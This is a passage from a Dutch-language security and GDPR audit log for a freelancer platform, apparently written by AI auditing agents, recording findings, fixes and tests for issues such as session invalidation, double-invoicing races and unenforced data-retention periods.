SSRF/secrets/XSS/CSV-formule/foutlek/open-redirect/headers (statisch grep + lees over `src/**`, focus op de
verse oppervlakken + verse brede sweep); (3) AVG betrokkenen-rechten (over-fetch naar client op de verse
franchise-roster-/reacties-/opdrachten-views, audit-logging, `anonymizeUser` vs. schema-drift, k-anonimiteit,
PII-in-logs, doorgifte-register art. 30, retentie). `npm audit --omit=dev` = **0 productie-kwetsbaarheden**
(3 dev-only: brace-expansion/js-yaml/esbuild, niet verscheept). Next.js 15.5.21 zit boven de
CVE-2025-29927-fix (middleware-bypass, gepatcht in 15.2.3).

**Alle drie oppervlakken onafhankelijk schoon** — geen nieuw KRITIEK/HOOG/MIDDEL security- of privacy-gat
door deze commits. Geverifieerd: de #943-TOCTOU-fix sluit de DUO/BIG-self-verificatie-race via een
compound `updateMany({where:{id,status:fromStatus}})` bínnen de transactie (concurrent admin-REJECTED wordt
niet overschreven); de twee anti-oracle-unificaties geven "niet gevonden" == "niet van jou" (CWE-203);
`openDispute` weigert nu server-side elke niet-ACTIVE samenwerking (voorheen kon een directe actie-aanroep
een PROPOSED/COMPLETED/CANCELLED-samenwerking bevriezen → griefing van `creditInvoice`'s `assertNotDisputed`);
de nieuwe franchise-roster-dormancy-afleiding is puur/server-side, tenant-gescoopt (`tenantScopeWhere`), en
stuurt alleen labels/aggregaat-tellingen naar de client (geen ruwe `lastLoginAt`/`email` als nieuwe
over-fetch); `/api/metrics`' nieuwe `zzp_verification_queue_oldest_age_seconds` is een PII-vrije leeftijd
achter de `authorizeCron`-Bearer-guard. **Eén geparkeerd AVG-retentie-sub-item technisch afgedwongen
(HOOG → OPGELOST, rood→groen).**

### OPGELOST — HOOG (AVG art. 5(1)(e) opslagbeperking): "Reactie-inhoud max. 4 weken na afronding selectieprocedure" was niet technisch afgedwongen

- **Repro (was):** het verwerkingsregister (`opdrachten-reacties-matching`) belooft reactie-inhoud "tot 4
  weken na afronding van de selectieprocedure", maar er was **geen enkele geplande taak** die dat afdwong
  (grep: geen `application-retention` in `src/`; `run-all` wiret audit-/webhook-/lead-/health-/routing-cache-/
  notification-retentie, niet Application). Gevolg: `Application`-rijen — met **vrije-tekst-PII in `motivation`**
  (kan bijzondere-categorie-gegevens art. 9 bevatten, zie de eigen comment in `account-anonymization.ts`) en
  de interne `note` — stapelden zich **onbeperkt voorbij het beloofde 4-wekenvenster** op, in tegenspraak met
  het eigen gepubliceerde opslagbeperkingsbeleid. Sub-deel (c) van het bredere geparkeerde HOOG-retentie-item
  (ronde 2026-07-26); notificatie-retentie (#937) was deel (a) van diezelfde lijn.
- **Geschonden regel:** AVG art. 5(1)(e) (opslagbeperking — niet langer bewaren dan noodzakelijk).
- **Fix (PR #—):** nieuwe geplande sweep `runApplicationRetentionTask` (`src/lib/application-retention-task.ts`,
  spiegelt `notification-retention-task.ts`: gebatchte id-select + `deleteMany`, BATCH_SIZE 500 / MAX_BATCHES
  200, SQLite+Postgres, idempotent) die **alleen terminale, niet-geaccepteerde** reacties hard verwijdert:
  `status ∈ {REJECTED, WITHDRAWN}` én `updatedAt < cutoff` (updatedAt, niet createdAt — ankert "na afronding")
  én **`collaboration: { is: null }`**. Die laatste guard is kritiek: `Collaboration.applicationId` cascadeert
  `onDelete: Cascade` vanaf Application, dus een reactie mét samenwerking wissen zou de héle samenwerking
  (facturen/prestaties) mee-casceren — de guard sluit dat categorisch uit, óók als de status-invariant ooit
  verschuift. NEW/VIEWED/SHORTLIST (nog in procedure) en ACCEPTED (leidde tot werk) blijven staan. Schrijft
  één PII-vrij auditrecord (`APPLICATIONS_PRUNED`, metadata `{pruned, retentionDays, cutoff}`). Config
  `APPLICATION_RETENTION_DAYS` (default 28 = 4 wk, minimumvloer 7, expliciete `0` = uit) + pure
  `applicationRetentionCutoff`. Gewired in `run-all`; register-entries (`opdrachten-reacties-matching`-retentie
  - `RETENTION_SCHEDULE.reacties-sollicitaties`-rationale) noemen nu de afdwingende sweep. +17 unit-tests
    (rood→groen: zonder de taak bleven oude reacties eeuwig staan; **cascade-guard: een REJECTED-mét-samenwerking
    wordt nooit gewist**; NEW/VIEWED/SHORTLIST/ACCEPTED blijven; minimumvloer; multi-batch; audit-alleen-bij-snoei;
    PII-vrije metadata; idempotentie; expliciete uit; pure-cutoff-grenzen).

## Ronde 2026-07-27 (basis: `main` @ 8c7f471a)

Audit: orchestrator (Opus 4.8) + 1 parallelle adversariële Opus-audit op de sinds de vorige ronde (`42650618`)
verse niet-design-oppervlakken (#931–#936): `/api/metrics` + `observability/metrics.ts` (nieuwe
subscription-expiry-backlog-gauge), `client-stats.ts` (`applicationsByStatus`), `client-application-funnel.ts`,
`jobs/active-filters.ts` + `active-filter-chips.tsx` (URL/searchParam-manipulatie), `jobs/compliance-chip.ts`,
en de +73/+52 regels op `inzicht/page.tsx` en `opdrachten/(index)/page.tsx`. Onderzocht op: object-/ownership-/
tenant-autorisatie & IDOR, PII-over-fetch naar de client, k-anonimiteit (markttarief ≥10), XSS/injectie/open-redirect
in de nieuwe UI, `/api/metrics`-auth (CRON_SECRET/Bearer, PII-vrije gauges), secret-/foutlek. **Oppervlak schoon** —
geen nieuw KRITIEK/HOOG/MIDDEL/LAAG security- of privacy-gat. Geverifieerd: `/api/metrics` fail-closed
(503 zonder secret, 401 op fout token via timing-safe `authorizeCron`, alleen `Authorization`-header — geen
`?token=` in access-logs), de nieuwe gauge is een PII-vrije `count()`; `applicationsByStatus` is company-scoped
(`company.id` uit `findUnique({userId})` → geen cross-tenant IDOR, alleen aggregaat-tellingen, geen kandidaat-PII);
chip-labels met user-input worden als `{chip.label}` in JSX gerenderd (React-escape, geen XSS), URL's via
`URLSearchParams`/`encodeURIComponent` (geen open-redirect/injectie), `sort` via `JOB_SORTS`-whitelist;
`computeMarketBand` handhaaft `MARKET_RATE_MIN_SAMPLE = 10`. Geen mutatie-oppervlak geraakt (alles read-only
view/observability). **Eén geparkeerde AVG-retentie-belofte technisch afgedwongen (HOOG → OPGELOST, rood→groen).**

### OPGELOST — HOOG (AVG art. 5(1)(e) opslagbeperking): "Notificatiehistorie max. 6 maanden" was niet technisch afgedwongen

- **Repro (was):** het verwerkingsregister (entry `notificaties-email`) belooft "Notificatiehistorie max. 6
  maanden", maar er was **geen enkele geplande taak** die dat afdwong (geverifieerd via grep: geen
  `NOTIFICATION_RETENTION`/`notification-retention` in `src/`). `run-all` wired alleen `audit-/webhook-event-/
lead-/health-incident-/routing-cache-retention`. Gevolg: `Notification`-rijen — die **PII in `title`/`body`**
  dragen (bv. "Nieuwe reactie van &lt;naam&gt; op &lt;opdracht&gt;", bedragen, statusupdates) — stapelden zich
  **onbeperkt voorbij het beloofde 6-maandenvenster** op in de DB, in tegenspraak met het eigen gepubliceerde
  opslagbeperkingsbeleid. Sub-deel van het bredere geparkeerde HOOG-retentie-item (ronde 2026-07-26); dit is het
  laagst-risico, best-begrensde eerste increment (geen blob-cascade, geen bijzondere-categorie-document).
- **Geschonden regel:** AVG art. 5(1)(e) (opslagbeperking — niet langer bewaren dan noodzakelijk).
- **Fix (PR #—):** nieuwe geplande sweep `runNotificationRetentionTask` (`src/lib/notification-retention-task.ts`,
  spiegelt `lead-retention-task.ts`: gebatchte id-select + `deleteMany`, BATCH_SIZE 500 / MAX_BATCHES 200,
  SQLite+Postgres, idempotent) die notificaties met `createdAt < cutoff` hard verwijdert ongeacht lees-/digest-/
  push-status (max-bewaartermijn voor de hele historie) en één PII-vrij auditrecord schrijft
  (`NOTIFICATIONS_PRUNED`, metadata `{pruned, retentionDays, cutoff}`). Config `NOTIFICATION_RETENTION_DAYS`
  (default 180 = 6 mnd, minimumvloer 30, expliciete `0` = uit) + pure `notificationRetentionCutoff`. Gewired in
  `run-all` naast de andere `*-retention`-taken. Register-entry `notificaties-meldingen` toegevoegd aan
  `RETENTION_SCHEDULE` + de `notificaties-email`-`retention`-tekst noemt nu de afdwingende sweep. +13 unit-tests
  (rood→groen: zonder de taak bleven oude notificaties eeuwig staan; gelezen én ongelezen gewist; minimumvloer;
  multi-batch; audit-alleen-bij-snoei; idempotentie; expliciete uit; pure-cutoff-grens).

### Resterend geparkeerd uit het bredere HOOG-retentie-item (ronde 2026-07-26)

De overige sub-modellen van "gedocumenteerde bewaartermijnen niet technisch afgedwongen" blijven staan als aparte,
kleinere increments: (a) `Document`+blob van EXPIRED/REJECTED credentials (bijzondere categorie, art. 9 — vereist
grace-venster + zorgvuldige hard-delete-logica), (b) `Message`-inhoud >12 mnd na samenwerkingseinde. ~~(c) stale
`Application` >4 wk~~ → **OPGELOST in ronde 2026-07-27b** (`runApplicationRetentionTask`). Elk als eigen getest
increment; notification-retentie (#937) was deel (a) van deze lijn, application-retentie (deze ronde) deel (c).
Resterend aanbevolen volgende increment: (b) `Message`-retentie — vergt eerst het bounden van "samenwerkingseinde"
per gesprek (Conversation↔Collaboration is niet 1:1), dus zorgvuldiger dan de Application-sweep.

## Ronde 2026-07-26b (basis: `main` @ 42650618)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) object-/functie-niveau-autorisatie & tenant-isolatie op de sinds `faaefb42` verse oppervlakken
(#924–#930): invoice-actions (`facturen/actions.ts`, anti-dubbelfacturatie #927/#930), de cascade-command-laag
(`commands-shared.ts`/`invoice-/performance-/contract-/dispute-/payment-commands.ts`, existence-oracle #928),
`pending-tasks.ts`, `received-invitations.ts`, `signals.ts` (FRANCHISER nav-badge #930), op IDOR/BOLA/TOCTOU
en cross-tenant-lek; (2) injectie/upload/SSRF/secrets/XSS/CSV-formule/foutlek/open-redirect (statisch grep +
lees over `src/**`); (3) AVG betrokkenen-rechten (over-fetch naar client, audit-logging, `anonymizeUser`-
volledigheid tegen het schema, k-anonimiteit, PII-in-logs, doorgifte-register art. 30, retentie).

Alle drie oppervlakken **onafhankelijk schoon** — geen nieuw KRITIEK/HOOG/MIDDEL security- of privacy-gat.
Geverifieerd: de in-transactie TOCTOU-guard van #930 (`overlapGuardPerformanceId`) sluit het dubbele-urenstaat-
venster écht (in-tx her-lees op `tx`, niet slechts gedocumenteerd); de anti-oracle-consistentie (#928) geeft
niet-partij een identieke "niet gevonden" als een onbekend id op álle 11 muterende cascade-commando's
(CWE-203); de FRANCHISER nav-badge-queries in `signals.ts`/`pending-tasks.ts` zijn `tenantId`-gescoopt op de
eigen tenant van de caller (geen client-input, geen cross-tenant-lek); geen `select:{user:true}`/hele-relatie-
`include` toegevoegd (0 over-fetch naar client); geen raw-SQL-interpolatie, één nonce-gated
`dangerouslySetInnerHTML` (statische themescript), CSV-formule-guard (`escapeCsvField` `=+-@\t\r`) op álle
12 exports, `/api/metrics` Bearer-`CRON_SECRET`-gated met alleen PII-vrije gauges, Geoapify-host vast uit env
(geen SSRF), geen open-redirect met user-URL, geen secret in client-bundle of log, `.env`/`*.db`/`/storage/`
niet in git. `schema.prisma` ongewijzigd sinds `faaefb42` → geen nieuw PII-veld dat `anonymizeUser` mist.
`npm run typecheck`/`lint`/`prettier --check`/`test`/`build` groen. **Eén concrete financiële-integriteit-
TOCTOU (dubbelfacturatie) gevonden én OPGELOST (rood→groen).**

### OPGELOST — MIDDEL (CLAUDE.md regel 1, server-side waarheid — financiële integriteit): losse-factuur-gate had een TOCTOU-venster t.o.v. de uren-/prestatie-cascade (dubbelfacturatie)

- **Repro (was):** `createInvoice` (`src/app/(protected)/facturen/actions.ts`) leest de dubbele-facturatie-gate
  (`performance.count` + cascade-`invoice.count`) **buiten elke transactie**, en creëert dáárna de losse factuur
  zonder herverificatie. Tussen die lees en de write zit parse-/validatiewerk. In dat venster kan een
  (bijna-)gelijktijdige `createPerformance`/cascade-factuur op **dezelfde samenwerking** committen; beide
  requests zagen in de pre-check nog "geen cascade" → er landt zowel een **losse** factuur als de **cascade**-
  flow voor één samenwerking = dubbele facturatie van dezelfde opdrachtgever. Symmetrisch met het cascade-zijdige
  TOCTOU dat #930 net dichtte, maar op de losse-factuur-zijde nog open. (Same-owner: de ZZP'er racet tegen
  zichzelf — geen cross-tenant/IDOR, wél een integriteits-/server-side-waarheid-gat.)
- **Geschonden regel:** CLAUDE.md regel 1 (server-side is de waarheid: geen kritieke integriteits-invariant
  client-/race-afhankelijk). Past in de #927/#930 anti-dubbelfacturatie-lijn.
- **Fix (PR #—):** gedeelde `usesCascadeFlow(client, collaborationId)` (draait op de prisma- óf tx-client, één
  telling → geen drift) + gedeelde `CASCADE_FLOW_MESSAGE`. De pre-transactionele fast-fail blijft; de losse-
  factuur-`create` draait nu bínnen `prisma.$transaction` met een **in-transactie herverificatie** die de
  transactie terugrolt (sentinel `CascadeFlowRaceError` → exact dezelfde gebruikersmelding, geen 500/id-lek)
  zodra er alsnog een cascade-flow blijkt. Spiegelt de in-transactie overlap-guard van de cascade-laag
  (`commands-shared.ts`). +3 unit-tests (rood→groen: pre-fix creëerde de losse factuur alsnog bij prestatie- én
  bij cascade-factuur-race; plus regressie tegen over-blokkeren) in `facturen/actions.test.ts`.

### Geparkeerd — LAAG (defense-in-depth, uit deze ronde)

- **Dossier-export bouwt `text/plain` zonder formule-escape.** `src/app/api/samenwerkingen/[id]/dossier/route.ts`
  (~r113-141) bouwt de dossiertekst via `lines.join("\n")` zónder `escapeCsvField`. Nu **laag risico** omdat het
  als `text/plain` met een `.txt`-bestandsnaam wordt geserveerd (geen spreadsheet-formulecontext). **Aanbevolen:**
  zodra dit ooit `.csv`/`text/csv` wordt, user-content door `escapeCsvField` halen (CWE-1236). Geen actie nu.
- **`createPerformance`/`updatePerformance` schrijven geen `AuditLog`.** `src/lib/cascade/performance-commands.ts`
  (~r119-214) muteert een DRAFT/REJECTED-prestatie direct via `prisma.performance.create/update` zonder auditregel
  (anders dan de DomainEvent-gedekte `submit/approve/reject`). DRAFT heeft geen extern effect tot `submitPerformance`
  (wél geaudit via DomainEvent), dus laag. **Aanbevolen:** een lichte `PERFORMANCE_DRAFT_SAVED`-audit voor volledige
  regel-5-dekking ("audit alles wat telt"), als apart klein increment. Pre-existing, geen regressie.

## Ronde 2026-07-26 (basis: `main` @ faaefb42)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) object-/functie-niveau-autorisatie: `authz.ts`/`tenancy.ts`/`auth(.config).ts`/`middleware.ts` + **álle**
server actions (~45 `actions.ts`) én route handlers (~35 `/api/**`) + de cascade-command-laag, op IDOR/BOLA
en cross-tenant-lek; (2) injectie/upload/SSRF/secrets/XSS/foutlek: `$queryRaw(Unsafe)`, `dangerouslySetInnerHTML`,
CSV-/formule-injectie (alle 12 exports), upload-validatie/path-traversal/magic-byte, secrets in log/client-bundle,
server-side `fetch` met user-URL, open redirect; (3) AVG betrokkenen-rechten: `anonymizeUser`-volledigheid
veld-voor-veld tegen het volledige schema, over-fetch naar de client, audit-logging van gevoelige toegang,
k-anonimiteit (≥10), PII-in-logs, retentie, doorgifte naar derden. Focus op de sinds `7a6957cc` verse
oppervlakken (SES/SigV4-maildriver #919, `/api/metrics` #888, wachtwoord-/reset-flows, systeemstatus-zelftests).

Oppervlakken **(1) en (2) onafhankelijk schoon** — de auth→rol→ownership/tenant→Zod→actie→audit-keten,
existence-oracle-404-pariteit (CWE-203) op álle document/PDF/dossier-routes, tenant-scoping, `toCsv`/`escapeCsvField`
formule-guard op elke export, magic-byte upload-sniff + path-traversal-guard in de storage-abstractie, e-mailtemplates
die alle user-content via `esc()` escapen, timing-safe cron-auth, geen user-gestuurde `fetch`-host (Geoapify/DUO/BIG/
iDIN/SES gebruiken een vaste env-host; user-input alleen in query/body), geen secret in client-bundle of log, geen
stacktrace/Prisma-fout naar de gebruiker. De verse SES-maildriver (`aws-sigv4.ts`/`mail-sender.ts`) is correct: JSON-body
(geen SMTP-header-injectie), secret verlaat de signer nooit, region uit env, foutdetail zonder adres/onderwerp (PII).
`npm run typecheck`/`lint`/`test` (4918+) /`build` groen. **2 concrete AVG-gaten gevonden én OPGELOST (rood→groen).**

### OPGELOST — LAAG→MIDDEL (AVG art. 5(1)(e) + art. 30): verlopen routing-cache (Geoapify locatie-PII) werd nooit fysiek verwijderd + ontbrak in het verwerkingsregister

- **Repro (was):** `GeocodeCache`/`TravelRouteCache` (schema.prisma) bewaren **platte-tekst locatiegegevens**
  (`query`, `fromQuery`, `toQuery` — herleidbare adres-/plaatsindicaties van ZZP'ers en opdrachten) die naar de
  externe verwerker Geoapify gaan. Elke rij heeft een `expiresAt`, maar de leeslaag (`routing.ts:55,90`) negeerde
  verlopen rijen alléén **lazy** bij lezen — er was **geen enkele `deleteMany`** voor deze twee modellen (geverifieerd
  via grep), dus platte-tekst-locatie-PII stapelde zich **voorbij de eigen TTL eindeloos** op in de DB. Bovendien had
  het art. 30-`PROCESSING_REGISTER` **geen entry** voor deze concrete doorgifte-naar-derde (locatie → Geoapify),
  anders dan bv. de `notificaties-email`-entry die zijn verwerker wél documenteert.
- **Geschonden regel:** AVG art. 5(1)(e) (opslagbeperking — niet langer bewaren dan noodzakelijk) + art. 30
  (verwerkingsregister-volledigheid voor een doorgifte naar een derde).
- **Fix (PR #—):** nieuwe geplande sweep `runRoutingCacheRetentionTask` (`src/lib/routing-cache-retention-task.ts`,
  spiegelt `lead-retention-task.ts`: gebatchte id-select + `deleteMany`, BATCH_SIZE 500 / MAX_BATCHES 200, SQLite+Postgres,
  idempotent) die rijen met `expiresAt < now` uit **beide** tabellen hard verwijdert en één PII-vrij auditrecord
  (`ROUTING_CACHE_PRUNED`, metadata `{geocodePruned, routePruned, cutoff}`) schrijft, gewired in `run-all` naast de andere
  `*-retention`-taken. Plus register-entry #20 `reistijd-routing` (Geoapify als verwerker, TTL-bewaartermijn, SCC-caveat
  buiten EER). +7 unit-tests (rood→groen: verlopen rijen bleven staan zonder sweep; strict `<`-grens; multi-batch;
  audit-alleen-bij-snoei; idempotentie) + 4 register-tests.

### Geparkeerd — HOOG (AVG art. 5(1)(e)/17): gedocumenteerde bewaartermijnen voor de gevoeligste data zijn niet technisch afgedwongen

- **Repro:** het verwerkingsregister/`RETENTION_SCHEDULE` documenteert concrete bewaarvensters — Documenten/Credentials
  (VOG/diploma, art. 9/10) "niet langer dan noodzakelijk voor het verificatiedoel", Berichten "max. 12 maanden na
  beëindiging", Reacties "4 weken na afronding", Notificatiehistorie "max. 6 maanden" — maar er is voor géén van deze een
  geplande taak. `run-all` wired alleen `audit-/webhook-event-/lead-/health-incident-retention` (en nu routing-cache);
  `expiry-task.ts` flipt alleen `Credential.status` VERIFIED→EXPIRED en verwijdert het onderliggende `Document`/de blob
  nooit. Afgekeurde credential-scans en oude berichten/reacties/notificaties stapelen zich onbeperkt op, in tegenspraak
  met het eigen gepubliceerde opslagbeperkingsbeleid voor juist de gevoeligste datacategorie.
- **Geschonden regel:** AVG art. 5(1)(e) (opslagbeperking) / art. 17.
- **Aanbevolen fix (eigen increment — groter, zorgvuldig, raakt hard-delete van gevoelige documenten):** geplande
  sweeps (spiegel `lead-retention-task`/`health-incident-retention-task`) die na een respijtvenster (a) `Document`+blob
  van EXPIRED/REJECTED credentials, (b) `Message`-inhoud >12 mnd na samenwerkingseinde, (c) stale `Application` >4 wk,
  (d) `Notification` >6 mnd purgen/anonimiseren; wire in `run-all`. Per sub-model één klein, apart, getest increment.

### Onveranderd geparkeerd — KRITIEK (FG-/juridische beslissing, MENSENWERK §5 — NIET unilateraal gefixt)

Door-derden-geschreven vrije-tekst-PII over de gewiste persoon (o.a. `Review.comment` waar `subjectId == userId`,
`NoShowReport.reason`, `Performance/Invoice.rejectionReason`) overleeft `anonymizeUser` (AVG art. 17, mogelijk art. 9) —
zie de eerdere ronde-2026-07-23b-entry. **Deze audit heeft dit expliciet herbevestigd maar bewust NIET geraakt:** het is
een twee-richtingsdeur (erasure vs. het geschil-/dossierbelang + de uitingsvrijheid van de tegenpartij) die per
CLAUDE.md/MENSENWERK §5 een menselijke FG-/juridische sign-off vereist, geen agent-beslissing. Blijft open voor de mens.

## Ronde 2026-07-25b (basis: `main` @ 7a6957cc)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) auth/sessie/account-lifecycle: `auth.ts`/`auth.config.ts`/`middleware.ts`, login/register/reset-flows,
JWT-sessiecallbacks, account-status-enforcement (SUSPENDED/anon), wachtwoord-reset-token, rate-limiting;
(2) álle `/api/**`-route-handlers: IDOR/BOLA + existence-oracle (CWE-203) op PDF/dossier/document/media,
cross-tenant, SSRF, CSV-/formule-injectie in exports, cron-auth, webhook-signature/replay; (3) AVG
betrokkenen-rechten (over-fetch naar client, audit-logging van gevoelige toegang, PII-in-logs, minimalisatie
naar derden, `anonymizeUser`-volledigheid voor zelf-geschreven PII). Focus op de sinds `d2fe963a` verse
oppervlakken (Postmark-mail-driver #911, franchise-voordraag-overzicht, cascade-anti-oracle-commands).
Oppervlakken (2) en (3) **schoon** — de authz-keten + existence-oracle-404-pariteit, `toCsv`/`escapeCsvField`,
timing-safe cron-auth, Stripe-webhook-HMAC+replay, tenant-scoping, over-fetch-regressietests
(`profile-overfetch.test.ts`), PII-veilige logger, minimalisatie naar Geoapify/mailprovider en de
uitzonderlijk uitputtende `anonymizeUser` dekken de bekende klassen. Ook geverifieerd: Postmark-driver spiegelt
de Resend-seam (JSON-body → geen SMTP-header-injectie; token nooit gelogd), e-mailtemplates escapen alle
user-content via `esc()`/`htmlEscape`, `npm audit --omit=dev` = 0, geen `dangerouslySetInnerHTML` op
user-content. **Eén concrete auth-gap gevonden én OPGELOST (rood→groen).**

### OPGELOST — HOOG (OWASP A07): wachtwoord-reset/-wijziging trok bestaande (stateless) JWT-sessies op andere apparaten niet in

- **Repro (was):** de sessie is stateless JWT (`auth.config.ts`, `strategy:"jwt"`, `maxAge` 8u, `updateAge` 1u);
  er is geen `adapter` → de `Session`-tabel is dode schema, geen server-side sessiestore om in te trekken.
  `currentActor()` (`authz.ts:104`) hertoetst wél live rol/status/`anonymizedAt` uit de DB (schorsing/anonimisering
  werken direct), maar **niets over het wachtwoord/de credential** — er bestond geen `passwordChangedAt`/
  `tokenVersion`. Gevolg: een aanvaller met een gestolen sessiecookie (gedeeld/openbaar apparaat, via XSS
  geëxfiltreerd cookie, gelekt log) behoudt volledige toegang (VOG/diploma/ID-documenten downloaden, profiel
  wijzigen) óók nádat het slachtoffer via "Wachtwoord vergeten" het wachtwoord roteert — de reset raakte
  `status`/`role`/`anonymizedAt` niet, dus de oude JWT bleef geldig tot `maxAge` (8u), en effectief onbeperkt
  zolang de aanvaller de sessie binnen elk `updateAge`-venster (1u) levend houdt (schuivende her-uitgifte). De
  in-app `changePassword` riep wél `signOut()` aan, maar dat wist alléén het cookie van het **eigen** apparaat.
- **Geschonden regel:** OWASP A07 (Identification & Authentication Failures — geen session-invalidatie bij
  credentialwijziging). CLAUDE.md regel 1 (server-side is de waarheid: een credentialwijziging hoort élke
  bestaande sessie live ongeldig te maken).
- **Fix (PR #—):** wachtwoord-generatie-stempel `User.passwordChangedAt DateTime @default(now())`
  (`schema.prisma`). Bevroren in de JWT op **inlogmoment** (`auth.config.ts` `jwt()`-callback, alléén in het
  `if (user)`-blok → niet herzet bij `updateAge`-rotatie) en doorgegeven aan de sessie (`session()`-callback +
  `next-auth.d.ts`-typen). `authorizeCredentials` levert `passwordChangedAt` (epoch-millis) mee. `loadFreshUser`
  selecteert het veld nu; `currentActor()` wijst de sessie af (→ uitgelogd, fail-closed, zelfde patroon als
  status/anon) zodra de live DB-stempel voorbij de bevroren JWT-stempel ligt, via de pure, geteste helper
  `sessionPredatesPasswordChange` (fail-**open** alléén bij een pre-feature token zonder stempel — cyclet binnen
  8u vanzelf om, zodat de deploy niet iedereen uitlogt). `resetPassword` én `changePassword` zetten
  `passwordChangedAt: new Date()` mee (creates erven `@default(now())`). +4 unit-tests
  (`authz.test.ts`, rood→groen: pre-fix always-allow → `expect(...).toBe(true)` faalt), mock-user in
  `authorize-credentials.test.ts` bijgewerkt. Sluit zowel de e-mail-reset- als de in-app-wijziging-flow op álle
  apparaten, zonder een echte sessiestore.

## Ronde 2026-07-25 (basis: `main` @ d2fe963a)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) álle 52 server actions: auth→rol→ownership→Zod→actie→audit-keten, IDOR/BOLA, mass-assignment/
overposting, status-transitie-bypass, open redirect, ontbrekende audit; (2) álle 41 `/api/**`-route-handlers:
CSV-/formule-injectie in exports, cron/CRON_SECRET-auth, IDOR op PDF-/dossier-routes, SSRF, open redirect,
info-leak/existence-oracle, webhook-signature/replay; (3) AVG betrokkenen-rechten (erasure veld-voor-veld
per PII-model), dataminimalisatie/over-fetch, k-anonimiteit (markttarief ≥10), audit-logging van gevoelige
toegang, log-leaks, cross-partij PII. Oppervlakken (1) en (2) **schoon** — de authz-keten, CSV-escape
(`escapeCsvField`/`needsFormulaGuard`), timing-safe cron-auth, anti-oracle 404-pariteit, SSRF-host-allowlists
en timing-safe webhook-signature + atomische replay-guard (`ProcessedWebhookEvent`) dekken de bekende klassen.
Ook onafhankelijk geverifieerd: CSP (nonce + `strict-dynamic`, `object-src 'none'`), share-/agenda-feed-token
(HMAC-SHA256, timing-safe, length-checked, namespaced), PII-veilige logger (key+value-redactie, e-mailmasker),
geen `dangerouslySetInnerHTML` op user-content, `npm audit --omit=dev` = 0.

### OPGELOST — HOOG (privacy/AVG art. 17): bedrijfslogo-blob overleefde `anonymizeUser` → weesblob, half-voltooide verwijdering

- **Repro (was):** een CLIENT uploadt een bedrijfslogo via `updateCompanyProfile`
  (`bedrijf/actions.ts:79-80`, `getStorage().put(key, buffer, logo.type)` → `Company.logoKey = key`). Dit is
  een **tweede, onafhankelijke** storage-blob-callsite — géén `Document`-rij (bevestigd: slechts 3 `storage.put`-
  callsites: documenten/certificaten/bedrijf). Voert beheer later `anonymizeUser` uit, dan haalt de code alléén
  `Document`-rijen op voor opslag-opruiming (`ownerId: userId`) en zet `companyAnonymizationData()` `logoKey: null`
  op de `Company`-rij — maar roept **nooit** `storage.delete(company.logoKey)` aan. De afbeelding (voor een
  eenmanszaak mogelijk een persoonlijke (pas)foto) blijft voor altijd in de opslag; erger: zodra `logoKey` genulld
  is verwijst niets in de DB er meer naar → een **wees**blob die ook geen latere sweep meer kan vinden.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid) — de blob ≠ de DB-pointer. CLAUDE.md regel 4
  ("documenten/PII standaard privé, erasure moet volledig zijn"). OWASP A01 (data-eigenaarschap na erasure).
- **Fix (PR #—):** `anonymizeUser` haalt vóór de transactie `Company.logoKey` op (`findUnique`, `userId` is
  `@unique`) naast de bestaande `Document.findMany`, en wist ná de transactie de logo-blob best-effort mee via
  dezelfde `storage.delete` + `logStorageCleanupFailure`-opruimlus (null-guard: geen bedrijf/logo → geen delete).
  +2 unit-tests (`anonymize-erasure.test.ts`): logo-blob wél gewist (rood→groen: zonder fix faalt de assert) +
  null-guard (geen logo → geen lege-key-delete). Gedeelde hoisted delete-spy zodat de test op de exacte key assert.

### GEPARKEERD — KRITIEK (FG-/juridische beslissing, MENSENWERK §5): door-derden-geschreven PII over de betrokkene overleeft `anonymizeUser`

- **Repro:** `NoShowReport.reason`/`verdictNote` (`schema.prisma:772-786`, comment: "kan onbedoeld een
  gezondheids-/incapaciteitsreden bevatten" → art. 9 bijzondere categorie), `Review.comment` waar
  `subjectId == userId` (ontvangen beoordelingen), `Performance.rejectionReason` / `Invoice.rejectionReason`
  (REJECTED-tak, door de tegenpartij geschreven). `anonymizeUser` redact alléén **zelf**-geschreven vrije tekst;
  deze door-derden-geschreven-PII-óver-de-betrokkene blijft na "verwijdering" leesbaar (bv. op `/admin/no-shows`),
  herleidbaar via de nog-levende `NoShowReport.freelancerProfileId`.
- **Severity:** KRITIEK. **Geschonden beginsel:** AVG art. 17 dekt PII **over** de betrokkene, óók door een derde
  geschreven. **Waarom geparkeerd:** dit is een echte juridische tweesprong (redact-en-behoud-rij vs. documenteer
  een bewaargrond bij arbeids-/facturatiegeschil) — MENSENWERK §5 markeert dit als off-limits voor autonome
  agent-actie; een FG moet beslissen vóór echte VOG/diploma-/no-show-data live gaat. Al ≥15 rondes bekend; deze
  ronde opnieuw geëscaleerd, niet unilateraal gewijzigd.
- **Aanbevolen fix (na FG-besluit):** ofwel redact deze velden mee in de `anonymizeUser`-transactie (gescopet op
  de betrokkene als subject), ofwel leg per veld een expliciete bewaargrond + bewaartermijn vast.

### GEPARKEERD — LAAG (product/FG-afweging): `kvkNumber` op een publiek, niet-ingelogd ZZP-profiel

- Ongewijzigd t.o.v. ronde 2026-07-24b (zie hieronder). Deze ronde herbevestigd: `profile-screen.tsx:539`
  toont `kvkNumber` aan anonieme bezoekers; voor een eenmanszaak via het Handelsregister koppelbaar aan het
  thuisadres (re-identificatie/doxxing-vector). AVG art. 5(1)(c). Tweesprong voor de eigenaar/FG.

## Ronde 2026-07-24b (basis: `main` @ f6ec7c72)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken —
(1) álle server actions + `/api/**`-route-handlers: auth→rol→ownership→Zod→actie→audit-keten, IDOR,
mass-assignment/overposting, BFLA, open redirect/CSRF; (2) cross-tenant-isolatie (`tenancy.ts`, franchise/
tenant-billing) + document/storage-privacy + upload-veiligheid + SSRF; (3) AVG betrokkenen-rechten
(erasure veld-voor-veld per PII-model), dataminimalisatie/over-fetch, k-anonimiteit, audit-logging van
gevoelige toegang, log-leaks. Oppervlakken (1) en (2) **schoon** — de authz-keten, tenant-scoping,
storage-abstractie (path-traversal-guard, magic-byte + malware-scan, server-side type/grootte), SSRF-
